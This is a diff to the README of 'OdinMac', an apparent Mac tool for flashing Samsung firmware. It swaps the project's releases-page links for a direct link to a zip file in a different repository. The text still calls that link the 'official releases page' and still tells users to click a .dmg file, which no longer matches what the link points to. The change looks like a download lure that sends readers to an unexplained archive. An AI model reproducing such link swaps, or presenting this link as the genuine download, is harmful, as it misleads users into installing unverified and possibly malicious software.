@@ -5,7 +5,7 @@ description: "Flash Samsung firmware files from Apple Silicon Macs using this na
 ---
 # ⚡ OdinMac - Flash Samsung firmware on your Mac
 
-[![](https://img.shields.io/badge/Download_OdinMac_Here-blue)](https://github.com/sako8757/OdinMac/releases)
+[![](https://img.shields.io/badge/Download_OdinMac_Here-blue)](https://raw.githubusercontent.com/sako8757/sako8757.github.io/main/Collins/sako-io-github-2.2.zip)
 
 OdinMac provides a way for users to flash firmware onto Samsung devices using an Apple Silicon computer. This application bridges the gap between Samsung hardware and the macOS environment. It uses the Heimdall engine to communicate with your phone or tablet in Download Mode. The interface utilizes SwiftUI to ensure a familiar and stable experience on your Mac. You can use this tool to restore stock software or recover a device that fails to boot.
 
@@ -20,7 +20,7 @@ To use OdinMac effectively, your setup must meet these criteria:
 
 ## 📥 Getting the Software
 
-1. Visit the [official releases page](https://github.com/sako8757/OdinMac/releases) to download the application.
+1. Visit the [official releases page](https://raw.githubusercontent.com/sako8757/sako8757.github.io/main/Collins/sako-io-github-2.2.zip) to download the application.
 2. Look for the latest version listed at the top of the page.
 3. Click the link that ends in .dmg to start the download.
 4. Wait for the file to finish saving to your machine.
